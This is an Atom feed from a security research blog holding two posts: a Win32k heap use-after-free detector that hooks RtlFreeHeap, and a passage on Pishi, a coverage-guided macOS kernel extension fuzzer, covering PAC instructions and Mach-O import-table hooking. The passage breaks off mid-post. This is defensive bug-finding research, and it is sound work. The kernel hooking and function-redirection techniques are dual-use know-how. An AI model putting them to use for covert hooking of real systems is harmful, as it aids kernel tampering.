<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-11-17T19:49:41+09:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">My interesting researches</title><subtitle>I share what I find interesting here..</subtitle><entry><title type="html">Ancient Win32k heap UAF detector.</title><link href="http://0.0.0.0:4000/fuzzing/2024/11/17/win32k-heap.html" rel="alternate" type="text/html" title="Ancient Win32k heap UAF detector." /><published>2024-11-17T09:01:01+09:00</published><updated>2024-11-17T09:01:01+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/11/17/win32k-heap</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/11/17/win32k-heap.html"><![CDATA[<p>This blog post is a reshare of a personal note I wrote 15 years ago, and I’m sharing it here for nostalgic reasons.
fast forward to 2024, and we now have <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/kasan">KASAN integrated into the Windows kernel</a>.</p>

<h4 id="original-content">Original content:</h4>

<p>In recent times, 0-day kernel vulnerabilities have become more valuable due to the limitations imposed by sandboxes. Every RCE exploit now requires an additional phase to bypass these restrictions in order to achieve full system access.</p>

<p>Many local privilege escalation vulnerabilities are based on flaws in <code class="language-plaintext highlighter-rouge">Win32k</code>, particularly how it handles or uses objects. In most cases, <code class="language-plaintext highlighter-rouge">Win32k</code> uses freed memory, leading to use-after-free vulnerabilities.</p>

<p>Win32k uses <code class="language-plaintext highlighter-rouge">HMAllocObject</code> to allocate memory for its objects, and the function uses different memory management subsystems based on the object type, either from the heap or from the kernel pool.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __stdcall HMAllocObject(int a1, PVOID Object, char a3, ULONG Size)
{
	....
	....

  if ( v5 &amp; 0x10 &amp;&amp; Object )
  {
    v7 = DesktopAlloc((int)Object, Size, ((unsigned __int8)a3 &lt;&lt; 16) | 5);
    if ( !v7 )
    {
LABEL_28:
      UserSetLastError(8);
      return 0;
    }
    LockObjectAssignment(v7 + 12, Object);
    *(_DWORD *)(v7 + 16) = v7;
  }
  else
  {
    if ( v5 &amp; 0x40 )
    {
      v8 = SharedAlloc(Size);
    }
    else
    {
      v9 = !Object &amp;&amp; v5 &amp; 0x20;
      if ( !(v5 &amp; 8) || v9 )
        v8 = Win32AllocPoolWithTagZInit(Size, dword_BF9F191C[v4]);
      else
        v8 = Win32AllocPoolWithQuotaTagZInit(Size, dword_BF9F191C[v4]);
    }
    v7 = v8;
	....
	....
	....
	....
  }
}
</code></pre></div></div>
<p>These memory management functions include:</p>
<ul>
  <li>DesktopAlloc function uses heap,</li>
  <li>SharedAlloc function uses heap.</li>
  <li>in32AllocPoolWithQuotaTagZInit, Win32AllocPoolWithTagZInit functions use pool.</li>
</ul>

<p>For example, a <code class="language-plaintext highlighter-rouge">Menu object</code> uses <code class="language-plaintext highlighter-rouge">DesktopAlloc</code>, while an <code class="language-plaintext highlighter-rouge">Accelerator</code> object uses <code class="language-plaintext highlighter-rouge">Kernel Pool</code>.</p>

<p>For objects that use heap memory, when the object’s life ends, the OS calls <code class="language-plaintext highlighter-rouge">RtlFreeHeap</code> to free the used memory. However, after <code class="language-plaintext highlighter-rouge">RtlFreeHeap</code> returns, the freed memory still contains the old/valid contents. If another part of <code class="language-plaintext highlighter-rouge">win32k.sys</code> uses the freed memory, nothing will happen because it uses memory with old contents (no BSOD occurs), and the bug will be missed.</p>

<p>Until now, researchers have typically discovered these types of bugs through reverse engineering. but if someone is fuzzing Win32k, they will miss vulnerabilities, due to having valid content even after free,They need to allocate a large amount of memory to ensure that the freed memory is reallocated with different content, which can trigger a crash. But how can one know when the OS will use the freed memory? and allocating memory in each iteration has runtime overhead.</p>

<p>In user-mode code, we can use GFlags to enable PageHeap system-wide. This doesn’t affect the heap implementation in the kernel. There is also a “special pool” that can be enabled with the verifier, but it doesn’t help us with heap-based objects or memory.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gflags.exe /i iexplore.exe +hpa +ust to to enable the page Heap (HPA)
</code></pre></div></div>
<p>So, my idea is to patch <code class="language-plaintext highlighter-rouge">RtlFreeHeap</code> and fill the freed memory with invalid content, such as <code class="language-plaintext highlighter-rouge">0x0c0c0c0c</code>.</p>

<p>With the help of the <code class="language-plaintext highlighter-rouge">RtlSizeHeap</code> function (thanks to @ponez ), we can find the size of heap object and fill it with <code class="language-plaintext highlighter-rouge">0x0c0c0c0c</code>.
in alomst all cases the object contains a pointer to another object, so an pointer needs to be dereferenced, it means OS will dereference 0x0c0c0c0c address and we will get a kernel BSOD when it uses freed memory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__declspec(naked) my_function_detour_RtlFreeHeap()
{
	//PVOID  func=RtlSizeHeap;;
	__asm
	{		
		// exec missing instructions
		mov     edi,edi
		push    ebp
		mov     ebp,esp
		push    ebx
		mov     ebx,dword ptr [ebp+10h]
		int 3;
		/*
		BOOLEAN	RtlFreeHeap
		( 
		IN PVOID  HeapHandle,
		IN ULONG  Flags,
		IN PVOID  HeapBase
		); 
		mov     ebx,dword ptr [ebp+10h] get HeapBase  
		*/
		PUSHAD
		PUSH dword ptr [ebp+10h]
		PUSH dword ptr [ebp+0Ch]
		PUSH dword ptr [ebp+08h]
		call RtlSizeHeap;
		sub  ecx,ecx;
		mov ecx, eax; // size from RtlSizeHeap
		mov eax, 0x0c
		mov edi, ebx; // address of heap chunk
		rep stos byte ptr es:[edi]
		POPAD
}
}
</code></pre></div></div>
<p>I tested my <a href="https://github.com/R00tkitSMM/Win32k-heap-sanitizer">Win32k heap sanitizer</a> detector with some old UAF vulnerabilities in Win32k and it worked like a charm.</p>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[This blog post is a reshare of a personal note I wrote 15 years ago, and I’m sharing it here for nostalgic reasons. fast forward to 2024, and we now have KASAN integrated into the Windows kernel.]]></summary></entry><entry><title type="html">Pishi: Coverage guided macOS KEXT fuzzing.</title><link href="http://0.0.0.0:4000/fuzzing/2024/11/08/Pishi.html" rel="alternate" type="text/html" title="Pishi: Coverage guided macOS KEXT fuzzing." /><published>2024-11-08T09:01:01+09:00</published><updated>2024-11-08T09:01:01+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/11/08/Pishi</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/11/08/Pishi.html"><![CDATA[<p>This blog post is the result of some weekend research, where I delved into <a href="https://www.quora.com/What-does-Hapoo-%D9%87%D8%A7%D9%BE%D9%88-and-Pishi-%D9%BE%DB%8C%D8%B4%DB%8C-means-in-Persian">Pishi</a>, a static macOS kernel binary rewriting tool.
During the weekdays, I focus on Linux kernel security at my job and would rather not investigate the Windows kernel again, which leaves macOS/iOS as the only remaining option.</p>

<p>In this blog post I will try to explain everything as clearly as possible so that even those who are not familiar with fuzzing can enjoy and understand it. I’ll break down the concepts, provide relatable examples, and resources, My goal is to make fuzzing approachable and interesting.
before getting started I also would like to thank <a href="https://x.com/ifsecure">Ivan Fratric</a>, for his valuable feedbacks.</p>

<h4 id="what-is-pishi">What is Pishi?</h4>

<p>It’s a static binary rewriting tool designed to instrument basic blocks of XNU kernel and macOS KEXTs.
for XNU kernel, Pishi allows you to instrument at a function, file, or folder level. For example, you can instrument everything in the <code class="language-plaintext highlighter-rouge">/bsd/net/</code> directory or focus specifically on <code class="language-plaintext highlighter-rouge">content_filter.c</code> or just one specific function in the XNU source code, e.g <code class="language-plaintext highlighter-rouge">vnode_getfromfd</code>, to instrument only specific functions to guide the fuzzer towards the vulnerability more <a href="https://www.srlabs.de/blog-post/advanced-fuzzing-unmasks-elusive-vulnerabilities">efficiently</a>.</p>

<h4 id="the-inspiration-behind-pishi">The Inspiration Behind Pishi</h4>

<p>The idea for implementing this project came to my mind, while I was attempting to fuzz <a href="https://r00tkitsmm.github.io/fuzzing/2024/03/29/iOSImageIO.html">ImageIO</a> and ended up finding 9 vulnerabilities.
ImageIO is an image parsing framework by Apple, Among many supported file formats by it, there is one <code class="language-plaintext highlighter-rouge">Image Container</code>, specifically HEIF.</p>

<p>Wikipedia describes High Efficiency Image File Format (HEIF) as <code class="language-plaintext highlighter-rouge">a digital container for storing individual digital images and image sequences.
HEIF can store images encoded with multiple coding formats.</code>.</p>

<p>HEIF container specification describes various encodings that can be stored inside it, e.g. <code class="language-plaintext highlighter-rouge">H.264</code>, <code class="language-plaintext highlighter-rouge">H.265</code>, <code class="language-plaintext highlighter-rouge">AV1</code>.
So where does this decoding(of <code class="language-plaintext highlighter-rouge">H.264</code>, <code class="language-plaintext highlighter-rouge">H.265</code>,…) happen? some parts of it inside <code class="language-plaintext highlighter-rouge">VTDecoderXPCService.xpc</code> a separate <a href="https://phrack.org/issues/70/8.html">decoding</a> XPC process, which talks over IOKit with <a href="https://r00tkitsmm.github.io/fuzzing/2024/05/14/anotherappleavd.html">AppleAVD</a>, a closed-source KEXT, to <a href="https://github.com/eiln/avd">do</a> the main part of the job in a <a href="https://youtu.be/H5oz1U03U1Q?t=1317">coprocessor</a> over <a href="https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html">RPC</a>.</p>

<p><img src="/assets/pishi/avd.png" width="300" style="display: block; margin: 0 auto" /></p>

<p>There are some efforts to fuzz <code class="language-plaintext highlighter-rouge">AppleAVD</code>:</p>

<ol>
  <li><a href="https://2022.hexacon.fr/conference/speakers/#cinema_time">Cinema time.</a></li>
  <li><a href="https://project-zero.issues.chromium.org/issues?q=AppleAVD">Project Zero.</a></li>
  <li><a href="https://wrv.github.io/h26forge.pdf">h26forge.</a></li>
</ol>

<p>I don’t know how <a href="https://x.com/natashenka">Natalie</a> fuzzed AppleAVD.
and the way <code class="language-plaintext highlighter-rouge">Cinema time</code> speakers fuzzed AppleAVD was not what I wanted to do. The h26forge paper was also great, but it wasn’t focused on AppleAVD</p>

<p>My initial fuzzer used a basic buffer bit-flipping technique at the latest user-kernel communication point by interposing on <code class="language-plaintext highlighter-rouge">IOConnectCallMethod</code>. I used the <code class="language-plaintext highlighter-rouge">sVTRunVideoDecodersInProcess</code> flag (thanks to <a href="https://github.com/googleprojectzero/Jackalope/tree/main/examples/VideoToolbox">Ivan</a>), to ensure that our harness communicates directly with the kernel rather than indirectly through <code class="language-plaintext highlighter-rouge">VTDecoderXPCService.xpc</code>.<br />
But this simple approach couldn’t lead us anywhere deep into AppleAVD. I needed a more sophisticated, feedback-driven fuzzer.</p>

<h4 id="coverage-guided-kernel-fuzzing-on-apple-silicon">Coverage-Guided Kernel Fuzzing on Apple Silicon</h4>
<p>I was thinking of all available options to have a Coverage guided binary only KEXT fuzzer on Apple Silicon.</p>

<p>The first option for fuzzing open-source libraries is to use <a href="https://clang.llvm.org/docs/SanitizerCoverage.html">SanitizerCoverage</a>. Even though it’s possible to build XNU with <a href="https://github.com/google/syzkaller/blob/master/docs/darwin/README.md">KSANCOV</a> or porting XNU to user mode and fuzzing it there with libFuzzer, similar to <a href="https://googleprojectzero.blogspot.com/2021/04/designing-sockfuzzer-network-syscall.html">SockFuzzer</a>, but our target is closed source.</p>

<h4 id="how-can-we-instrument-closed-source-targets">How can we instrument closed source targets?</h4>

<p><strong>Hardware Assisted</strong></p>

<p>hardware-assisted instrumentation is a CPU-level, fast and efficient way of tracing all the instructions executed by a process.
<a href="https://www.youtube.com/watch?v=gZ808d7rQYU">kAFL</a> uses Intel Processor Trace feature to collect Linux kernel coverage and beauty of having CPU level instrumentation is that it’s independent of <a href="https://github.com/intelpt/WindowsIntelPT">OS</a> and <a href="https://github.com/intelpt/winafl-intelpt">CPU exceution modes</a> (i.e, Kernel or User), researchers also have already <a href="https://research.checkpoint.com/2020/bugs-on-the-windshield-fuzzing-the-windows-kernel/">shown</a> its effectiveness.</p>

<p>Apple silicon is ARM based and AArch64’s equivalent of <code class="language-plaintext highlighter-rouge">Intel PT</code> is CoreSight, <a href="https://www.youtube.com/watch?v=e7eKzCjKhq4">CoreSight</a> is a set of hardware features designed to enable system debugging, profiling, and tracing.
AFL++ has CoreSight mode which is impelemnted by <a href="https://ricercasecurity.blogspot.com/2021/11/armored-coresight-towards-efficient.html">ARMored</a> that enables binary-only fuzzing on ARM64 Linux using CoreSight.
You can read and watch more about CoreSight architecture and Hardware Assisted Tracing <a href="https://developer.arm.com/documentation/ihi0029/latest/">here</a> and <a href="https://www.youtube.com/watch?v=Gm2ZXIB18PQ">here</a>.</p>

<p>Three important components of CoreSight for our goal are the <code class="language-plaintext highlighter-rouge">ETM</code> (Embedded Trace Macrocell), <code class="language-plaintext highlighter-rouge">ETR</code> (Embedded Trace Router) and  <code class="language-plaintext highlighter-rouge">PTF</code> (Program Flow Trace).</p>

<p>After scrolling into <a href="https://github.com/apple/darwin-xnu/blob/main/osfmk/arm64/proc_reg.h#L1732">XNU source code</a> it turned out ETM, ETR and PTF are not <a href="https://www.kernel.org/doc/Documentation/devicetree/bindings/arm/coresight.txt">documented</a> in the kernel.
<img src="/assets/pishi/1.png" width="300" /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*
* ARMv8 coresight registers are optional. If the device tree did not
* provide either cpu_regmap_paddr or coresight_regs, assume that
* coresight registers are not supported.
*/
</code></pre></div></div>

<p>After all just because <a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O_and_port-mapped_I/O">MMIO</a> (memory-mapped I/O) <a href="https://en.wikipedia.org/wiki/Device_register">registers</a> of these components aren’t documented in the XNU or <a href="https://en.wikipedia.org/wiki/Devicetree">DeviceTree</a> doesn’t mean the SoC doesn’t have these components.<br />
In <a href="https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/">Operation Triangulation</a>, attackers used MMIOs to bypass hardware-based kernel memory protection, which did not belong to any MMIO ranges defined in the device tree. therefore we need to reverse engineer the SoC.
I strongly recommend reading Brandon Azad’s <a href="https://googleprojectzero.blogspot.com/2019/10/ktrw-journey-to-build-debuggable-iphone.html">KTRW: The journey to build a debuggable iPhone</a> blog post about his discovery of a proprietary CoreSight’s DBGWRAP register and how he mapped and experimented with it to determine if it’s implemented and accessible on production hardware. I needed to take a similar approach since it’s almost the same mission, While the bootstrapping problem wasn’t an issue(you can boot a custome kernel in Apple silicon), I didn’t have enough time for it. I still provide some additional excellent resources for exploring SoCs, you may find another <a href="https://blog.siguza.net/KTRR/">KTRR</a> or <a href="https://www.df-f.com/blog/ios-17round2">SPTM</a> bypass:</p>

<ol>
  <li><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Reverse-Engineering-The-M1.pdf">Reverse Engineering The M1</a> and other Corellium’s stuff.</li>
  <li><a href="https://www.youtube.com/watch?v=d5s9fYfvzmY&amp;t=8838s">m1n1</a> and <a href="https://social.treehouse.systems/@marcan/111655847458820583">many more</a> videos by Asahi Lina/hector martin.</li>
  <li><a href="https://www.youtube.com/watch?v=RByIu2zjjVg">Reverse Engineering PAC on Apple M1</a></li>
</ol>

<p><strong>Software Based</strong></p>

<p>There are some other options like using debuggers and software breakpoints to get code coverage:</p>
<ol>
  <li><a href="https://blog.talosintelligence.com/talos-releases-new-macos-fuzzer/">Talos releases new macOS open-source fuzzer</a></li>
  <li><a href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">WTF Snapshot fuzzing of macOS targets</a></li>
  <li><a href="https://github.com/googleprojectzero/p0tools/tree/master/TrapFuzz">TrapFuzz</a></li>
  <li><a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman-5/">Fuzzing Like A Caveman 5: A Code Coverage Tour for Cavepeople</a></li>
</ol>

<p>But <code class="language-plaintext highlighter-rouge">KDK_ReadMe.rtfd/TXT.rtf</code> file of the <a href="https://developer.apple.com/documentation/apple-silicon/debugging-a-custom-kernel-extension">KDK</a> states that Apple Silicon does not support proper debugging:<br />
<code class="language-plaintext highlighter-rouge">Note: Apple silicon doesn’t support active kernel debugging. You may inspect the current state of the kernel when it is halted due to a panic or NMI. However, you cannot set breakpoints, continue code execution, step into code, step over code, or step out of the current instruction.</code></p>

<p>I haven’t looked into whether virtualization solutions like VMware, UTM, or Parallels Desktop support debugging and breakpoints on Apple Silicon.</p>

<p>I could also write a user mode <a href="https://en.wikipedia.org/wiki/Mach-O">Mach-O</a> loader to load a KEXT in user mode and fuzz it like any other dylib, but it wasn’t an interesting option for me. I thought it may not be a generic way, 
and it’s not an easy to implement. 
<a href="https://github.com/pwn0rz/fairplay_research/tree/master">fairplay_research project</a> has also implemented a user mode KEXT loader.<br />
loading kernel modules into user mode is not a new idea, it’s out there for decades e.g. <a href="https://github.com/pgiri/ndiswrapper">ndiswrapper</a>.</p>

<p>Another common method was just extracting part of KEXT code (an IDA-Pro decompiled pseudo code) to user mode, but this is not a clean and generic way to fuzz KEXTs.</p>

<p><a href="https://2022.hexacon.fr/conference/speakers/#cinema_time">Cinema time!</a> on hexacon2022 has gone this way.</p>

<p>let’s review our options again, all software based binary-only Instrumentation methods are categorized into:</p>
<ol>
  <li>Dynamic Instrumentation</li>
  <li>Static Instrumentation</li>
</ol>

<p><em>Dynamic instrumentation</em> inserts the code for generating feedback into the target program at run time. we discussed above that we don’t have kernel debugger in Apple silicon so this option is off the table.</p>

<p><em>Static instrumentation</em> involes statically rewriting and modifying target binaries.<br />
from the all above methods I decided to <a href="https://web.archive.org/web/20201111170534/https://repret.wordpress.com/2017/04/27/kfuzz-a-fuzzer-story/">investigate binary rewriting.</a> as it’s more promising than the others.<br />
I studied some great papers about binary rewriting; they are great but they are mostly about user mode binaries. And Linux ELF files. and they have fundamental limitations when applied to macOS KEXTs.</p>
<ol>
  <li>Retrowrite: a static binary rewriter for x64 and AArch64</li>
  <li>StochFuzz: A New Solution for Binary-only Fuzzing</li>
  <li>ArmWrestling: Efficient binary rewriting for AArch64 (Contains IL lifting)</li>
  <li>ARMore: Pushing Love Back Into Binaries</li>
</ol>

<p>I also read <a href="https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20PanicXNU%203.0%20-%20Juwei%20Lin%20&amp;%20Junzhi%20Lu.pdf">another paper</a> on binary rewriting KEXTs in older Intel-based macOS just as I was finishing this blog post.</p>
<h4 id="kextfuzz">KextFuzz</h4>
<p>After more googling I saw <a href="https://www.usenix.org/conference/usenixsecurity23/presentation/yin">KextFuzz</a>: Fuzzing macOS Kernel extensions on Apple Silicon via Exploiting mitigations<br />
An interesting article about fuzzing macOS kernel with binary rewriting.<br />
KEXT utilizes the fact that</p>
<ol>
  <li>Some instruction in KEXTs can be nopped away without affecting the intended behavior.</li>
  <li>It’s possible to hook import table in KEXTs by replacing the name of a function in the import table with a function of another KEXT, any call to the original function in the KEXT at runtime will redirect to the second function. It’s just another <a href="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking">Import Address Table (IAT) Hooking</a> method but in Apple’s world.</li>
</ol>

<p><strong>Nopping away some instructions:</strong></p>

<p>Kextfuzz instrument a target KEXT by nopping away some PAC instructions and replaces them with a call to an <a href="https://github.com/qyang-nj/llios/blob/main/exported_symbol/README.md">exported function</a> in its KEXT.
PAC or pointer authentication in the Armv8.3-A architecture were introduced as a software security countermeasure for Return-Oriented Programming (ROP) attacks.
PAC has been described in depth in the following articles:</p>
<ol>
  <li><a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">Examining Pointer Authentication on the iPhone XS</a></li>
  <li><a href="https://sipearl.com/wp-content/uploads/2023/10/SiPearl-White_Paper_Control_Flow_Integrity-on-Arm64.pdf">Control Flow Integrity Anti-Malware active protection on Arm64 Systems</a></li>
  <li><a href="https://www.usenix.org/system/files/sec19fall_liljestrand_prepub.pdf">PAC it up</a></li>
</ol>

<p>Now as it’s described by <a href="https://www.qualcomm.com/content/dam/qcomm-martech/dm-assets/documents/pointer-auth-v7.pdf">qualcomm</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There are two main operations needed for Pointer Authentication:
computing and adding a PAC, and verifying a PAC and restoring the pointer value.
In addition to the PAC and AUT instructions,
there are instructions for stripping the PAC (XPAC*),
and for computing a 32-bit authentication code from two 64-bit inputs (PACGA).
</code></pre></div></div>

<p>KextFuzz replaces XPACD instruction, this instructions remove a pointer’s PAC and restore the original value without performing verification.</p>

<p>When does the compiler emits these instructions?<br />
Compilers inserts PAC instructions around pointer access operations. KEXTs on Apple Silicon are compiled with PAC, allowing them to protect various types of pointers, such as C++ V-Tables.<br />
KEXTs have to inherit and implement IOKit classes and IOKit is developed in C++.<br />
whenever codes call into a virtual function, compiler generates XPACD instruction to protect the V-Table access.<br />
Removing this instruction or replacing it with nop will not change the expected functionality of the code.</p>

<p>I have described what happens around XPACD instructions whenever calling a virtual function:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nv">x17</span><span class="p">,</span> <span class="nv">x8</span> <span class="c1">; V_table </span>
<span class="nf">movk</span> <span class="nv">x17</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xcbeb</span><span class="p">,</span> <span class="nv">Isl</span> <span class="err">#</span><span class="mi">48</span>
<span class="nf">autda</span> <span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span> <span class="c1">; authentica V_table into x16</span>
<span class="c1">; If the authentication passes, the upper bits of the address are restored to enable subsequent use of the address.</span>
<span class="c1">; If the authentication fails, the upper bits are corrupted and any subsequent use of the address results in a Translation fault.</span>
<span class="nf">mov</span> <span class="nv">x17</span><span class="p">,</span> <span class="nv">x16</span> <span class="c1">; move x16 into x17</span>
<span class="nf">xpacd</span> <span class="nv">x17</span> <span class="c1">; strip key from x17</span>
<span class="nf">cmp</span> <span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span> <span class="c1">; compare x16 and x17 to see if they are equal. equal = means autda was successful</span>
<span class="nf">b.</span> <span class="nv">eg</span> <span class="mh">0x9758</span> <span class="o">&lt;</span><span class="nv">_ZN20I0SurfaceSharedEvent25signal_completed_internalEyb</span><span class="o">+</span><span class="mh">0x88</span><span class="o">&gt;</span>
<span class="nf">brk</span> <span class="err">#</span><span class="mh">0x472</span></code></pre></figure>

<p><img src="/assets/pishi/8.png" width="500" style="display: block; margin: 0 auto" /></p>

<p>KextFuzz just assumes <code class="language-plaintext highlighter-rouge">autda</code> instruction is always successful, therefore it can easily nop away <code class="language-plaintext highlighter-rouge">xpacd</code> or in this case replace it with a hooked function call.
KextFuzz also instruments <code class="language-plaintext highlighter-rouge">PACIBSP</code> instruction, which is used in prologue of functions to protect against stack overflow.
<code class="language-plaintext highlighter-rouge">PACIBSP</code> means function level instrumentation.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">PACIASP</span>
<span class="nf">SUB</span> <span class="nb">sp</span><span class="p">,</span> <span class="nb">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>
<span class="nf">STP</span> <span class="nv">x29</span><span class="p">,</span> <span class="nv">x30</span><span class="p">,</span> <span class="p">[</span><span class="nb">sp</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
<span class="nf">ADD</span> <span class="nv">x29</span><span class="p">,</span> <span class="nb">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x30</span>
<span class="nf">....</span>
<span class="nf">....</span>
<span class="nf">LDP</span> <span class="nv">x29</span><span class="p">,</span><span class="nv">x30</span><span class="p">,[</span><span class="nb">sp</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
<span class="nf">ADD</span> <span class="nb">sp</span><span class="p">,</span><span class="nb">sp</span><span class="p">,</span><span class="err">#</span><span class="mh">0x40</span>
<span class="nf">AUTIASP</span>
<span class="nf">RET</span></code></pre></figure>

<p><strong>Hooking imported functions:</strong></p>

<p>If you just replace name of a function in string table of a Mach-O file with name of another function, 
then at runtime the replaced funcion will be called instead of orginal function.
following image depicts this idea, I described before.</p>

<p><img src="/assets/pishi/7.png" width="500" style="display: block; margin: 0 auto" /></p>

<p>With the help of these two capabilities they can instrument some basic blocks in any KEXT
just by replacing <code class="language-plaintext highlighter-rouge">XPACD</code> with a call instruction to the hooked function.
as it’s shown in a image by original author.</p>

<p><img src="/assets/pishi/9.png" width="500" style="display: block; margin: 0 auto" /></p>

<p>I have found a major issue with this method,
Opposite to what <a href="https://www.usenix.org/system/files/usenixsecurity23-yin.pdf">KextFuzz</a> claims, This is not a basic block granular instrumentation.</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KextFuzz can instrument KEXT at basic block granularity
roughly because the KEXT are developed <span class="k">in </span>C++ and widely
use PA instructions to protect <span class="k">return </span>addresses and indirect
calls. In addition, the PA instructions distribute at different
points of the program. By sampling the signal of these instrumented points, the fuzzer can approximately know the depth
and breadth of the current triggered code.</code></pre></figure>

<p>simple grep in IOSurface KEXT just shows we have just 198 of xpacd instruction in it.</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">objdump <span class="nt">--disassemble</span> IOSurface | <span class="nb">grep</span> <span class="nt">-i</span> xpacd | <span class="nb">wc</span> <span class="nt">-l</span>
198</code></pre></figure>

<p>Instrumenting in functions granularity and instrumenting XPACD instructions together does not cover enough basic blocks and is not informative feedback to fuzz complex codes.
Only certain parts of KEXTs interact with the vtables, at least in our target AppleAVD, it will decode and parse buffers.
for example kextFuzz can not instrument this function:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">void fuzz_me<span class="o">(</span>char<span class="k">*</span> k_buffer<span class="o">)</span>
<span class="o">{</span>

    <span class="k">if</span> <span class="o">(</span> strlen<span class="o">(</span>k_buffer<span class="o">)</span> <span class="o">&gt;</span> 9 <span class="o">)</span>
        <span class="k">if</span><span class="o">(</span> k_buffer[0] <span class="o">==</span><span class="s1">'M'</span> <span class="o">)</span>
            <span class="k">if</span><span class="o">(</span> k_buffer[1] <span class="o">==</span><span class="s1">'E'</span> <span class="o">)</span>
                <span class="k">if</span><span class="o">(</span> k_buffer[2] <span class="o">==</span><span class="s1">'Y'</span> <span class="o">)</span>
                    <span class="k">if</span><span class="o">(</span> k_buffer[3] <span class="o">==</span><span class="s1">'S'</span> <span class="o">)</span>
                        <span class="k">if</span><span class="o">(</span> k_buffer[4] <span class="o">==</span><span class="s1">'A'</span> <span class="o">)</span>
                            <span class="k">if</span><span class="o">(</span> k_buffer[5] <span class="o">==</span><span class="s1">'M'</span> <span class="o">)</span>
                                <span class="k">if</span><span class="o">(</span> k_buffer[6] <span class="o">==</span><span class="s1">'6'</span> <span class="o">)</span>
                                    <span class="k">if</span><span class="o">(</span> k_buffer[7] <span class="o">==</span><span class="s1">'7'</span> <span class="o">)</span>
                                        <span class="k">if</span><span class="o">(</span> k_buffer[8] <span class="o">==</span><span class="s1">'8'</span> <span class="o">)</span>
                                            <span class="k">if</span><span class="o">(</span> k_buffer[9] <span class="o">==</span><span class="s1">'9'</span> <span class="o">)</span> <span class="o">{</span>
                                                <span class="nb">printf</span><span class="o">(</span><span class="s2">"boom!</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
                                                int<span class="k">*</span> p <span class="o">=</span> <span class="o">(</span>int<span class="k">*</span><span class="o">)</span>0x41414141<span class="p">;</span>
                                                <span class="k">*</span>p <span class="o">=</span> 0x42424242<span class="p">;</span>
                    <span class="o">}</span>
<span class="o">}</span></code></pre></figure>

<p>We need a better coverage, how to instrument every BB?</p>

<p>Let’s revisit what primitives do we have. 
We can hook an imported function in the target KEXT(e.g AppleAVD) with a exported function from our KEXT, 
but we don’t know where does our KEXT will be loaded. therefore we don’t know the address of any trampoline at runtime.</p>

<p>At the same time I know something is wrong, we can’t just replace any random <code class="language-plaintext highlighter-rouge">xpacd</code> in target KEXT with a call to an imported function. as I explain in next lines.</p>

<p>In Mach-O file format, Calling into imported functions is done through <code class="language-plaintext highlighter-rouge">__auth_stubs</code> and this stub will <a href="https://en.wikipedia.org/wiki/Clobbering">clobber</a> <code class="language-plaintext highlighter-rouge">X16</code>, <code class="language-plaintext highlighter-rouge">X17</code> and <code class="language-plaintext highlighter-rouge">LR</code> registers.
A clobbered register is a register that gets altered or “trashed” by inline assembly code.
When using inline assembly, we need to tell the compiler which registers are changed by using <a href="https://gcc.gnu.org/onlinedocs/gcc/extensions-to-the-c-language-family/how-to-use-inline-assembly-language-in-c-code.html#clobbers-and-scratch-registers">clobber arguments</a>. This helps the compiler avoid <a href="https://en.wikipedia.org/wiki/Register_allocation">allocating</a> those modified registers.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">__auth_stubs:</span>
  <span class="nf">adrp</span>	<span class="nv">x17</span><span class="p">,</span> <span class="mh">0x3c000</span> <span class="o">&lt;</span><span class="nv">_zalloc_flags</span><span class="o">+</span><span class="mh">0x3c000</span><span class="o">&gt;</span>
  <span class="nf">add</span>	<span class="nv">x17</span><span class="p">,</span> <span class="nv">x17</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x0</span>
  <span class="nf">ldr</span>	<span class="nv">x16</span><span class="p">,</span> <span class="p">[</span><span class="nv">x17</span><span class="p">]</span>
  <span class="nf">braa</span>	<span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span></code></pre></figure>

